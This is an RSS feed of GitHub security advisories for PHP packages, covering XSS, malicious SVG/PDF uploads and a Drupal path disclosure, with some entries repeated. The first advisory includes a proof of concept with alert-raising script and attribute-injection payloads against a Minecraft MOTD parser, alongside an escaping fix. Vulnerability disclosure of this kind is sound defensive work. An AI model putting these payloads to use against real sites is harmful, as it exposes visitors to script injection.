<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-10-06T10:01:17.620Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[dev-lancer/minecraft-motd-parser] Minecraft MOTD Parser's HtmlGenerator vulnerable to XSS]]></title>
        <id>https://github.com/advisories/GHSA-q898-frwq-f3qp</id>
        <link href="https://github.com/advisories/GHSA-q898-frwq-f3qp"/>
        <updated>2024-10-04T18:51:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>HtmlGenerator</code> class is subject to potential cross-site scripting (XSS) attack through a parsed malformed Minecraft server MOTD.</p>
<h3 id="context">Context</h3>
<p>Minecraft server owners can set a so-called MOTD (Message of the Day) for their server that appears next to the server icon and below the server name on the multiplayer server list of a player's Minecraft client. The Minecraft server sends the MOTD in the <code>description</code> property of the <a href="https://wiki.vg/Server_List_Ping#Status_Response">Status Response</a> packet. The <a href="https://github.com/jgniecki/MinecraftMotdParser">jgniecki/MinecraftMotdParser</a> PHP library is able to parse the value of the <code>description</code> property, which can be either a string or an array of text components. By utilizing the aforementioned <code>HtmlGenerator</code> class, it is also able to transform the value into an HTML string that can be used to visualize the MOTD on a web page.</p>
<h3 id="details">Details</h3>
<p>The <code>HtmlGenerator</code> iterates through objects of <code>MotdItem</code> that are contained in an object of <code>MotdItemCollection</code> to generate a HTML string. An attacker can make malicious inputs to the <code>color</code> and <code>text</code> properties of <code>MotdItem</code> to inject own HTML into a web page during web page generation. For example by sending a malicious MOTD from a Minecraft server under their control that was queried and passed to the <code>HtmlGenerator</code>.</p>
<p>This XSS vulnerability exists because the values of these properties are neither filtered nor escaped, as can be seen here:</p>
<ul>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80</a></li>
</ul>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>JavaScript code can be injected into the <code>HtmlGenerator</code> by parsing either a string via <code>TextParser</code> or an array via <code>ArrayParser</code>. The following code examples demonstrate the vulnerability by triggering the alert dialog of the browser.</p>
<h4 id="xss-via-textparser">XSS via <code>TextParser</code></h4>
<pre><code class="language-php">&lt;?php

use DevLancer\MinecraftMotdParser\Collection\MotdItemCollection;
use DevLancer\MinecraftMotdParser\Generator\HtmlGenerator;
use DevLancer\MinecraftMotdParser\Parser\TextParser;

$motdCollection = (new TextParser())-&gt;parse('&lt;script&gt;alert("XSS on page load")&lt;/script&gt;', new MotdItemCollection());

echo (new HtmlGenerator())-&gt;generate($motdCollection);
</code></pre>
<h4 id="xss-via-arrayparser">XSS via <code>ArrayParser</code></h4>
<pre><code class="language-php">&lt;?php

use DevLancer\MinecraftMotdParser\Collection\MotdItemCollection;
use DevLancer\MinecraftMotdParser\Generator\HtmlGenerator;
use DevLancer\MinecraftMotdParser\Parser\ArrayParser;

$motdCollection = (new ArrayParser())-&gt;parse([
    [
        'color' =&gt; '#" onmouseover="javascript:alert(\'XSS when mouse pointer enters the span element\')"',
        'text' =&gt; 'Hover me',
    ],
    [
        'color' =&gt; '#000000',
        'text' =&gt; '&lt;script&gt;alert("XSS on page load")&lt;/script&gt;',
    ]
], new MotdItemCollection());

echo (new HtmlGenerator())-&gt;generate($motdCollection);
</code></pre>
<h3 id="impact">Impact</h3>
<p>If the <code>HtmlGenerator</code> class of this library is used, this XSS vulnerability can potentially affect:</p>
<ul>
<li>Players visiting Minecraft server list websites (of which there are several dozen online, written in PHP) that display the MOTD.</li>
<li>Users visiting Minecraft server status websites to query information about a Minecraft server.</li>
<li>Server owners managing their Minecraft server via a web interface that displays the MOTD, where the attack could be carried out by a malicious Minecraft server plugin that modifies the MOTD without the server owner's consent.</li>
</ul>
<p>It is not clear if and which platforms depend on this library.</p>
<h3 id="remediation">Remediation</h3>
<p>I suggest converting all HTML special characters in the values of the <code>color</code> and <code>text</code> properties to HTML entities. The display of the HTML entities will still be correct in the browser, but the XSS vulnerability will be eliminated as the values will no longer be interpreted as HTML by the browser.</p>
<p>This could be achieved by introducing a new private <code>escape</code> function in the <code>HtmlGenerator</code> class:</p>
<pre><code class="language-php">private function escape(string $text): string
{
    return htmlentities($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
</code></pre>
<p>This function should be called in the following two lines:</p>
<ul>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49</a>
Change to: <code>$tags['span'][] = sprintf('color: %s;', $this-&gt;escape($motdItem-&gt;getColor()));</code></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80</a>
Change to: <code>$value = sprintf($value, $this-&gt;escape($motdItem-&gt;getText()));</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/security/advisories/GHSA-q898-frwq-f3qp">https://github.com/jgniecki/MinecraftMotdParser/security/advisories/GHSA-q898-frwq-f3qp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47765">https://nvd.nist.gov/vuln/detail/CVE-2024-47765</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/commit/b0ab9d68a964cd3d74977f39a9e7af0a94509f7c">https://github.com/jgniecki/MinecraftMotdParser/commit/b0ab9d68a964cd3d74977f39a9e7af0a94509f7c</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80</a></li>
<li><a href="https://github.com/advisories/GHSA-q898-frwq-f3qp">https://github.com/advisories/GHSA-q898-frwq-f3qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q898-frwq-f3qp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-04T18:51:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sulu/sulu] Injection of arbitrary HTML/JavaScript code through the media download URL]]></title>
        <id>https://github.com/advisories/GHSA-6784-9c82-vr85</id>
        <link href="https://github.com/advisories/GHSA-6784-9c82-vr85"/>
        <updated>2024-10-03T18:26:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to inject arbitrary HTML/JavaScript code through the media download URL in Sulu CMS. It affects the SuluMediaBundle component. The vulnerability is a Reflected Cross-Site Scripting (XSS) issue, which could potentially allow attackers to steal sensitive information, manipulate the website's content, or perform actions on behalf of the victim.</p>
<h3 id="patches">Patches</h3>
<p>The problem has not been patched yet. Users should upgrade to patched versions once they become available. Currently affected versions are:</p>
<ul>
<li>2.6.4</li>
<li>2.5.20</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Until an official patch is released, users can implement additional input validation and output encoding for the 'slug' parameter in the MediaStreamController's downloadAction method. Alternatively, configuring a Web Application Firewall (WAF) to filter potentially malicious input could serve as a temporary mitigation.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub repository: <a href="https://github.com/sulu/sulu">https://github.com/sulu/sulu</a></li>
<li>Vulnerable code: <a href="https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106">https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sulu/sulu/security/advisories/GHSA-6784-9c82-vr85">https://github.com/sulu/sulu/security/advisories/GHSA-6784-9c82-vr85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47617">https://nvd.nist.gov/vuln/detail/CVE-2024-47617</a></li>
<li><a href="https://github.com/sulu/sulu/commit/a5a5ae555d282e88ff8559d38cfb46dea7939bda">https://github.com/sulu/sulu/commit/a5a5ae555d282e88ff8559d38cfb46dea7939bda</a></li>
<li><a href="https://github.com/sulu/sulu/commit/eeacd14b6cf55f710084788140d40ebb00314b29">https://github.com/sulu/sulu/commit/eeacd14b6cf55f710084788140d40ebb00314b29</a></li>
<li><a href="https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106">https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106</a></li>
<li><a href="https://github.com/advisories/GHSA-6784-9c82-vr85">https://github.com/advisories/GHSA-6784-9c82-vr85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6784-9c82-vr85</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T18:26:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sulu/sulu] Injection of arbitrary HTML/JavaScript code through the media download URL]]></title>
        <id>https://github.com/advisories/GHSA-6784-9c82-vr85</id>
        <link href="https://github.com/advisories/GHSA-6784-9c82-vr85"/>
        <updated>2024-10-03T18:26:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to inject arbitrary HTML/JavaScript code through the media download URL in Sulu CMS. It affects the SuluMediaBundle component. The vulnerability is a Reflected Cross-Site Scripting (XSS) issue, which could potentially allow attackers to steal sensitive information, manipulate the website's content, or perform actions on behalf of the victim.</p>
<h3 id="patches">Patches</h3>
<p>The problem has not been patched yet. Users should upgrade to patched versions once they become available. Currently affected versions are:</p>
<ul>
<li>2.6.4</li>
<li>2.5.20</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Until an official patch is released, users can implement additional input validation and output encoding for the 'slug' parameter in the MediaStreamController's downloadAction method. Alternatively, configuring a Web Application Firewall (WAF) to filter potentially malicious input could serve as a temporary mitigation.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub repository: <a href="https://github.com/sulu/sulu">https://github.com/sulu/sulu</a></li>
<li>Vulnerable code: <a href="https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106">https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sulu/sulu/security/advisories/GHSA-6784-9c82-vr85">https://github.com/sulu/sulu/security/advisories/GHSA-6784-9c82-vr85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47617">https://nvd.nist.gov/vuln/detail/CVE-2024-47617</a></li>
<li><a href="https://github.com/sulu/sulu/commit/a5a5ae555d282e88ff8559d38cfb46dea7939bda">https://github.com/sulu/sulu/commit/a5a5ae555d282e88ff8559d38cfb46dea7939bda</a></li>
<li><a href="https://github.com/sulu/sulu/commit/eeacd14b6cf55f710084788140d40ebb00314b29">https://github.com/sulu/sulu/commit/eeacd14b6cf55f710084788140d40ebb00314b29</a></li>
<li><a href="https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106">https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106</a></li>
<li><a href="https://github.com/advisories/GHSA-6784-9c82-vr85">https://github.com/advisories/GHSA-6784-9c82-vr85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6784-9c82-vr85</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T18:26:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sulu/sulu] Cross-site Scripting via uploaded SVG]]></title>
        <id>https://github.com/advisories/GHSA-255w-87rh-rg44</id>
        <link href="https://github.com/advisories/GHSA-255w-87rh-rg44"/>
        <updated>2024-10-03T18:25:41.000Z</updated>
        <content type="html"><![CDATA[<p>In Sulu v2.0.0 through v2.6.4 are vulnerable against XSS whereas a low privileged user with an access to the “Media” section can upload an SVG file with a malicious payload. Once uploaded and accessed, the malicious javascript will be executed on the victims’ (other users including admins) browsers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sulu/sulu/security/advisories/GHSA-255w-87rh-rg44">https://github.com/sulu/sulu/security/advisories/GHSA-255w-87rh-rg44</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47618">https://nvd.nist.gov/vuln/detail/CVE-2024-47618</a></li>
<li><a href="https://github.com/sulu/sulu/commit/ca72f75eebe41ea7726624d8aea7da6c425f1eb9">https://github.com/sulu/sulu/commit/ca72f75eebe41ea7726624d8aea7da6c425f1eb9</a></li>
<li><a href="https://github.com/advisories/GHSA-255w-87rh-rg44">https://github.com/advisories/GHSA-255w-87rh-rg44</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-255w-87rh-rg44</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T18:25:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[drupal/core] Drupal Full Path Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</id>
        <link href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc"/>
        <updated>2024-10-03T17:34:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45440">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>
<li><a href="https://www.drupal.org/project/drupal/issues/3457781">https://www.drupal.org/project/drupal/issues/3457781</a></li>
<li><a href="https://senscybersecurity.nl/CVE-2024-45440-Explained">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4827">https://github.com/github/advisory-database/pull/4827</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/10.3.6">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/11.0.5">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[drupal/core] Drupal Full Path Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</id>
        <link href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc"/>
        <updated>2024-10-03T17:34:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45440">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>
<li><a href="https://www.drupal.org/project/drupal/issues/3457781">https://www.drupal.org/project/drupal/issues/3457781</a></li>
<li><a href="https://senscybersecurity.nl/CVE-2024-45440-Explained">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4827">https://github.com/github/advisory-database/pull/4827</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/10.3.6">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/11.0.5">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[drupal/core-recommended] Drupal Full Path Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</id>
        <link href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc"/>
        <updated>2024-10-03T17:34:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45440">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>
<li><a href="https://www.drupal.org/project/drupal/issues/3457781">https://www.drupal.org/project/drupal/issues/3457781</a></li>
<li><a href="https://senscybersecurity.nl/CVE-2024-45440-Explained">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4827">https://github.com/github/advisory-database/pull/4827</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/10.3.6">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/11.0.5">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[drupal/core-recommended] Drupal Full Path Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</id>
        <link href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc"/>
        <updated>2024-10-03T17:34:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45440">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>
<li><a href="https://www.drupal.org/project/drupal/issues/3457781">https://www.drupal.org/project/drupal/issues/3457781</a></li>
<li><a href="https://senscybersecurity.nl/CVE-2024-45440-Explained">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4827">https://github.com/github/advisory-database/pull/4827</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/10.3.6">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/11.0.5">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[drupal/drupal] Drupal Full Path Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</id>
        <link href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc"/>
        <updated>2024-10-03T17:34:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45440">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>
<li><a href="https://www.drupal.org/project/drupal/issues/3457781">https://www.drupal.org/project/drupal/issues/3457781</a></li>
<li><a href="https://senscybersecurity.nl/CVE-2024-45440-Explained">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4827">https://github.com/github/advisory-database/pull/4827</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/10.3.6">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/11.0.5">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[drupal/drupal] Drupal Full Path Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</id>
        <link href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc"/>
        <updated>2024-10-03T17:34:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>core/authorize.php</code> in Drupal 11.x-dev allows Full Path Disclosure (even when error logging is None) if the value of <code>hash_salt</code> is <code>file_get_contents</code> of a file that does not exist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45440">https://nvd.nist.gov/vuln/detail/CVE-2024-45440</a></li>
<li><a href="https://www.drupal.org/project/drupal/issues/3457781">https://www.drupal.org/project/drupal/issues/3457781</a></li>
<li><a href="https://senscybersecurity.nl/CVE-2024-45440-Explained">https://senscybersecurity.nl/CVE-2024-45440-Explained</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4827">https://github.com/github/advisory-database/pull/4827</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/10.3.6">https://www.drupal.org/project/drupal/releases/10.3.6</a></li>
<li><a href="https://www.drupal.org/project/drupal/releases/11.0.5">https://www.drupal.org/project/drupal/releases/11.0.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mg8j-w93w-xjgc">https://github.com/advisories/GHSA-mg8j-w93w-xjgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg8j-w93w-xjgc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-29T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[contao/contao] Contao allows admin an account to upload SVG file containing malicious JavaScript]]></title>
        <id>https://github.com/advisories/GHSA-mrw8-5368-phm3</id>
        <link href="https://github.com/advisories/GHSA-mrw8-5368-phm3"/>
        <updated>2024-10-02T22:35:35.000Z</updated>
        <content type="html"><![CDATA[<p>Contao 5.4.1 allows an authenticated admin account to upload a SVG file containing malicious javascript code into the target system. If the file is accessed through the website, it could lead to a Cross-Site Scripting (XSS) attack or execute arbitrary code via a crafted javascript to the target.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45965">https://nvd.nist.gov/vuln/detail/CVE-2024-45965</a></li>
<li><a href="https://grimthereaperteam.medium.com/contao-5-4-1-malicious-file-upload-xss-in-svg-30edb8820ecb">https://grimthereaperteam.medium.com/contao-5-4-1-malicious-file-upload-xss-in-svg-30edb8820ecb</a></li>
<li><a href="https://github.com/advisories/GHSA-mrw8-5368-phm3">https://github.com/advisories/GHSA-mrw8-5368-phm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrw8-5368-phm3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-02T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tribalsystems/zenario] Zenario Cross Site Scripting in the Image library]]></title>
        <id>https://github.com/advisories/GHSA-2cc5-429x-p387</id>
        <link href="https://github.com/advisories/GHSA-2cc5-429x-p387"/>
        <updated>2024-10-02T22:35:25.000Z</updated>
        <content type="html"><![CDATA[<p>Zenario 9.7.61188 is vulnerable to Cross Site Scripting (XSS) in the Image library via the "Organizer tags" field.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45964">https://nvd.nist.gov/vuln/detail/CVE-2024-45964</a></li>
<li><a href="https://grimthereaperteam.medium.com/zenario-9-7-61188-reflect-xss-bee4ab9187e7">https://grimthereaperteam.medium.com/zenario-9-7-61188-reflect-xss-bee4ab9187e7</a></li>
<li><a href="https://github.com/advisories/GHSA-2cc5-429x-p387">https://github.com/advisories/GHSA-2cc5-429x-p387</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2cc5-429x-p387</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-02T21:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/october] October allows an admin account to upload PDF containing malicious JavaScript]]></title>
        <id>https://github.com/advisories/GHSA-hxpp-g76m-qhvg</id>
        <link href="https://github.com/advisories/GHSA-hxpp-g76m-qhvg"/>
        <updated>2024-10-02T22:35:21.000Z</updated>
        <content type="html"><![CDATA[<p>October 3.6.30 allows an authenticated admin account to upload a PDF file containing malicious JavaScript into the target system. If the file is accessed through the website, it could lead to a Cross-Site Scripting (XSS) attack or execute arbitrary code via a crafted JavaScript to the target.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45962">https://nvd.nist.gov/vuln/detail/CVE-2024-45962</a></li>
<li><a href="https://grimthereaperteam.medium.com/october-cms-3-6-30-stored-xss-ddf2be7a226e">https://grimthereaperteam.medium.com/october-cms-3-6-30-stored-xss-ddf2be7a226e</a></li>
<li><a href="https://github.com/advisories/GHSA-hxpp-g76m-qhvg">https://github.com/advisories/GHSA-hxpp-g76m-qhvg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hxpp-g76m-qhvg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-02T21:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tribalsystems/zenario] Zenario allows authenticated admin users to upload PDF files containing malicious code]]></title>
        <id>https://github.com/advisories/GHSA-3636-hx62-pv26</id>
        <link href="https://github.com/advisories/GHSA-3636-hx62-pv26"/>
        <updated>2024-10-02T22:35:06.000Z</updated>
        <content type="html"><![CDATA[<p>Zenario 9.7.61188 allows authenticated admin users to upload PDF files containing malicious code into the target system. If the PDF file is accessed through the website, it can trigger a Cross Site Scripting (XSS) attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45960">https://nvd.nist.gov/vuln/detail/CVE-2024-45960</a></li>
<li><a href="https://grimthereaperteam.medium.com/zenario-9-7-9-7-61188-malicious-file-upload-xss-in-pdf-eb11729fe059">https://grimthereaperteam.medium.com/zenario-9-7-9-7-61188-malicious-file-upload-xss-in-pdf-eb11729fe059</a></li>
